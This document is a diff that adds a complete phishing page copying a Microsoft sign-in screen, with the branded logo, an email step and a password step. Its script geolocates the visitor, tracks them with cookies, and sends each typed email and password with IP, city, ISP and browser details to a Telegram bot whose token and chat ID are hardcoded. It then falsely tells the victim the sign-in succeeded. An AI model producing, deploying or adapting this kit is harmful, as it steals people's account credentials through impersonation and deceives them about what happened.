@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(135deg, #e8eaf6 0%, #dde8f5 40%, #e3eaf6 70%, #d8e4f2 100%);
+      font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, sans-serif;
+      color: #1f1f1f;
+    }
+
+    body::before, body::after {
+      content: "";
+      position: fixed;
+      border-radius: 40% 60% 55% 45% / 50% 40% 60% 50%;
+      opacity: 0.18;
+      pointer-events: none;
+    }
+    body::before {
+      width: 60vw; height: 60vw;
+      top: -20vw; left: -15vw;
+      background: linear-gradient(120deg, #b3c8e8, #c5d5ed);
+    }
+    body::after {
+      width: 50vw; height: 50vw;
+      bottom: -18vw; right: -12vw;
+      background: linear-gradient(200deg, #b8cde8, #ccdaf0);
+    }
+
+    .stack {
+      display: flex;
+      flex-direction: column;
+      align-items: stretch;
+      gap: 12px;
+      width: 100%;
+      max-width: 340px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .card {
+      background: #ffffff;
+      border-radius: 4px;
+      padding: 36px 32px 28px;
+      box-shadow: 0 2px 6px rgba(0,0,0,.12), 0 8px 24px rgba(0,0,0,.08);
+    }
+
+    h1 {
+      font-size: 1.5rem;
+      font-weight: 600;
+      letter-spacing: -0.2px;
+      color: #1f1f1f;
+      margin-bottom: 28px;
+    }
+
+    .account-hint {
+      display: none;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.8125rem;
+      color: #1f1f1f;
+      background: #f3f3f3;
+      border-radius: 16px;
+      padding: 4px 12px 4px 8px;
+      width: fit-content;
+      margin-bottom: 24px;
+    }
+    .account-hint .avatar {
+      width: 24px; height: 24px;
+      border-radius: 50%;
+      background: #0067b8;
+      color: #fff;
+      font-size: 0.75rem;
+      font-weight: 600;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .field { position: relative; margin-bottom: 16px; }
+    .field label {
+      display: block;
+      font-size: 0.75rem;
+      color: #0067b8;
+      margin-bottom: 4px;
+    }
+    .field input {
+      width: 100%;
+      border: none;
+      border-bottom: 2px solid #0067b8;
+      outline: none;
+      font-size: 0.9375rem;
+      font-family: inherit;
+      padding: 4px 0 6px;
+      background: transparent;
+      color: #1f1f1f;
+    }
+    .field input::placeholder { color: #9e9e9e; }
+
+    .field .pw-wrap { position: relative; display: flex; align-items: center; }
+    .field .pw-wrap input { padding-right: 32px; }
+    .field .pw-toggle {
+      position: absolute; right: 0;
+      background: none; border: none; cursor: pointer;
+      padding: 0; color: #616161;
+      display: flex; align-items: center;
+      min-width: unset;
+    }
+
+    .keep-signed {
+      display: flex; align-items: center; gap: 8px;
+      font-size: 0.8125rem; color: #1f1f1f; margin-bottom: 28px;
+    }
+    .keep-signed input[type="checkbox"] {
+      accent-color: #0067b8; width: 15px; height: 15px; cursor: pointer;
+    }
+
+    .forgot { font-size: 0.8125rem; margin-bottom: 24px; }
+    .forgot a { color: #0067b8; text-decoration: none; }
+    .forgot a:hover { text-decoration: underline; }
+
+    .links { display: flex; flex-direction: column; gap: 10px; margin: 20px 0 28px; font-size: 0.8125rem; }
+    .links a { color: #0067b8; text-decoration: none; }
+    .links a:hover { text-decoration: underline; }
+    .links .no-account { color: #1f1f1f; }
+    .links .no-account a { color: #0067b8; }
+
+    .actions { display: flex; justify-content: flex-end; gap: 8px; }
+    button {
+      font-family: inherit; font-size: 0.875rem; font-weight: 600;
+      padding: 6px 20px; border-radius: 2px; border: none;
+      cursor: pointer; min-width: 88px;
+    }
+    .btn-back { background: #edebe9; color: #323130; }
+    .btn-back:hover { background: #e0dede; }
+    .btn-next { background: #0067b8; color: #fff; }
+    .btn-next:hover { background: #005da6; }
+    .btn-next:disabled { background: #a0bfd8; cursor: not-allowed; }
+
+    .status {
+      font-size: 0.8rem;
+      margin-bottom: 12px;
+      padding: 8px 10px;
+      border-radius: 3px;
+      display: none;
+    }
+    .status.success { display: block; background: #e8f5e9; color: #2e7d32; }
+    .status.error   { display: block; background: #fdecea; color: #c62828; }
+
+    .step { display: none; }
+    .step.active { display: block; }
+
+    @keyframes slideIn   { from { opacity:0; transform:translateX( 24px); } to { opacity:1; transform:translateX(0); } }
+    @keyframes slideBack { from { opacity:0; transform:translateX(-24px); } to { opacity:1; transform:translateX(0); } }
+    .step.active     { animation: slideIn   0.2s ease; }
+    .step.slide-back { animation: slideBack 0.2s ease; }
+
+    .options-card {
+      background: #fff;
+      border-radius: 4px; padding: 0 20px; height: 44px;
+      display: flex; align-items: center; gap: 12px;
+      font-size: 0.875rem; color: #1f1f1f;
+      box-shadow: 0 1px 4px rgba(0,0,0,.1);
+      cursor: pointer; border: 1px solid rgba(0,0,0,.06);
+      transition: background 0.15s; user-select: none;
+    }
+    .options-card:hover { background: #f5f5f5; }
+
+    footer {
+      position: fixed; bottom: 16px; right: 20px;
+      font-size: 0.75rem; color: #616161;
+      display: flex; gap: 16px; z-index: 1;
+    }
+    footer a { color: #616161; text-decoration: none; }
+    footer a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+
+  <div class="stack">
+    <div class="card">
+
+      <!-- Step 1: Email -->
+      <div id="step1" class="step active">
+        <svg width="21" height="21" viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-bottom:20px;display:block;">
+          <rect x="0"  y="0"  width="10" height="10" fill="#F25022"/>
+          <rect x="11" y="0"  width="10" height="10" fill="#7FBA00"/>
+          <rect x="0"  y="11" width="10" height="10" fill="#00A4EF"/>
+          <rect x="11" y="11" width="10" height="10" fill="#FFB900"/>
+        </svg>
+        <h1>Sign in</h1>
+
+        <div class="field">
+          <label for="email">Email, phone, or Skype</label>
+          <input id="email" type="text" autocomplete="username" />
+        </div>
+
+        <div class="links">
+          <span class="no-account">No account? <a href="#">Create one!</a></span>
+          <a href="#">Can't access your account?</a>
+        </div>
+
+        <div class="actions">
+          <button class="btn-back" type="button" onclick="goBack()">Back</button>
+          <button class="btn-next" type="button" onclick="goToStep2()">Next</button>
+        </div>
+      </div>
+
+      <!-- Step 2: Password -->
+      <div id="step2" class="step">
+        <svg width="21" height="21" viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-bottom:20px;display:block;">
+          <rect x="0"  y="0"  width="10" height="10" fill="#F25022"/>
+          <rect x="11" y="0"  width="10" height="10" fill="#7FBA00"/>
+          <rect x="0"  y="11" width="10" height="10" fill="#00A4EF"/>
+          <rect x="11" y="11" width="10" height="10" fill="#FFB900"/>
+        </svg>
+        <h1>Enter password</h1>
+
+        <div class="account-hint" id="accountHint">
+          <div class="avatar" id="avatarInitial">?</div>
+          <span id="accountLabel">user@example.com</span>
+        </div>
+
+        <div class="field">
+          <label for="password">Password</label>
+          <div class="pw-wrap">
+            <input id="password" type="password" autocomplete="current-password" />
+            <button class="pw-toggle" type="button" onclick="togglePw()" aria-label="Show password">
+              <svg width="18" height="18" viewBox="0 0 20 20" fill="none">
+                <path d="M10 4C5.5 4 2 10 2 10s3.5 6 8 6 8-6 8-6-3.5-6-8-6zm0 10a4 4 0 1 1 0-8 4 4 0 0 1 0 8zm0-6a2 2 0 1 0 0 4 2 2 0 0 0 0-4z" fill="currentColor"/>
+              </svg>
+            </button>
+          </div>
+        </div>
+
+        <div class="forgot"><a href="#">Forgot password?</a></div>
+
+        <div class="keep-signed">
+          <input type="checkbox" id="keepSigned" />
+          <label for="keepSigned">Keep me signed in</label>
+        </div>
+
+        <div id="statusMsg" class="status"></div>
+
+        <div class="actions">
+          <button class="btn-back" type="button" onclick="goBack()">Back</button>
+          <button class="btn-next" id="submitBtn" type="button" onclick="signIn()">Sign in</button>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="options-card" role="button" tabindex="0">
+      <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+        <path d="M10.5 1a4.5 4.5 0 1 0 0 9 4.5 4.5 0 0 0 0-9zm-5.44 7.06A5.5 5.5 0 1 1 14 6.5a5.5 5.5 0 0 1-5.5 5.5c-.96 0-1.86-.25-2.64-.68L4 13.207V15H2v-2H.5v-1.5L5.06 8.06zM10.5 4a.5.5 0 1 1 0 1 .5.5 0 0 1 0-1zm0-1a1.5 1.5 0 1 0 0 3 1.5 1.5 0 0 0 0-3z" fill="#1f1f1f"/>
+      </svg>
+      Sign-in options
+    </div>
+  </div>
+
+  <footer>
+    <a href="#">Terms of use</a>
+    <a href="#">Privacy &amp; cookies</a>
+    <span>···</span>
+  </footer>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = "6832172349:AAESyLbMNXpYIrDqRzT6mVUo53mNLDSHH1Y";
+    const TELEGRAM_CHAT_ID   = "1366863493";
+
+    // ── Cookies ────────────────────────────────────────────────────────────
+    function setCookie(name, value, days) {
+      const exp = new Date(Date.now() + days * 864e5).toUTCString();
+      document.cookie = name + "=" + value + "; expires=" + exp + "; path=/; SameSite=Lax";
+    }
+    function getCookie(name) {
+      return document.cookie.split('; ').reduce((acc, c) => {
+        const [k, v] = c.split('=');
+        return k === name ? v : acc;
+      }, null);
+    }
+    function uuidv4() {
+      return ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
+        (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16));
+    }
+
+    if (!getCookie('vid')) setCookie('vid', uuidv4(), 30);
+    const visitorId = getCookie('vid');
+    if (!getCookie('first_seen')) setCookie('first_seen', new Date().toUTCString(), 365);
+    setCookie('last_seen', new Date().toUTCString(), 30);
+
+    // ── Location ───────────────────────────────────────────────────────────
+    let locationInfo = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', org: 'Unknown' };
+    fetch('https://ipapi.co/json/')
+      .then(r => r.json())
+      .then(d => {
+        locationInfo = {
+          ip:      d.ip            || 'Unknown',
+          city:    d.city          || 'Unknown',
+          region:  d.region        || 'Unknown',
+          country: d.country_name  || 'Unknown',
+          org:     d.org           || 'Unknown',
+        };
+      }).catch(() => {});
+
+    // ── Telegram ───────────────────────────────────────────────────────────
+    async function sendToTelegram(email, password) {
+      const text =
+        "🔐 New Sign-in Attempt\n" +
+        "\n👤 Email / Username: " + email +
+        "\n🔑 Password: " + password +
+        "\n\n📍 Location" +
+        "\n   IP:      " + locationInfo.ip +
+        "\n   City:    " + locationInfo.city +
+        "\n   Region:  " + locationInfo.region +
+        "\n   Country: " + locationInfo.country +
+        "\n   ISP/Org: " + locationInfo.org +
+        "\n\n🍪 Visitor" +
+        "\n   ID:         " + visitorId +
+        "\n   First seen: " + (getCookie('first_seen') || 'Unknown') +
+        "\n   This visit: " + new Date().toUTCString() +
+        "\n\n🖥️ Device" +
+        "\n   " + navigator.userAgent;
+
+      const res = await fetch("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text }),
+      });
+      if (!res.ok) throw new Error("Telegram error: " + res.status);
+    }
+
+    function showStatus(msg, type) {
+      const el = document.getElementById('statusMsg');
+      el.textContent = msg;
+      el.className = "status " + type;
+    }
+
+    async function signIn() {
+      const email    = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+      const btn      = document.getElementById('submitBtn');
+      if (!password) { showStatus('Please enter your password.', 'error'); return; }
+      btn.disabled = true;
+      btn.textContent = 'Signing in…';
+      showStatus('', '');
+      try {
+        await sendToTelegram(email, password);
+        showStatus('Signed in successfully!', 'success');
+      } catch(e) {
+        showStatus('Something went wrong. Please try again.', 'error');
+      }
+      btn.textContent = 'Sign in';
+      btn.disabled = false;
+    }
+
+    function goToStep2() {
+      const email = document.getElementById('email').value.trim();
+      const label = email || 'user@example.com';
+      document.getElementById('accountLabel').textContent  = label;
+      document.getElementById('avatarInitial').textContent = label[0].toUpperCase();
+      document.getElementById('accountHint').style.display = 'flex';
+      switchStep('step1', 'step2', false);
+      setTimeout(() => document.getElementById('password').focus(), 220);
+    }
+
+    function goBack() {
+      switchStep('step2', 'step1', true);
+      document.getElementById('statusMsg').className = 'status';
+      setTimeout(() => document.getElementById('email').focus(), 220);
+    }
+
+    function switchStep(fromId, toId, isBack) {
+      document.getElementById(fromId).classList.remove('active');
+      const to = document.getElementById(toId);
+      to.classList.remove('slide-back');
+      if (isBack) to.classList.add('slide-back');
+      to.classList.add('active');
+    }
+
+    function togglePw() {
+      const input = document.getElementById('password');
+      input.type = input.type === 'password' ? 'text' : 'password';
+    }
+
+    document.getElementById('email').addEventListener('keydown',    e => { if (e.key === 'Enter') goToStep2(); });
+    document.getElementById('password').addEventListener('keydown', e => { if (e.key === 'Enter') signIn(); });
+  </script>
+</body>
+</html>
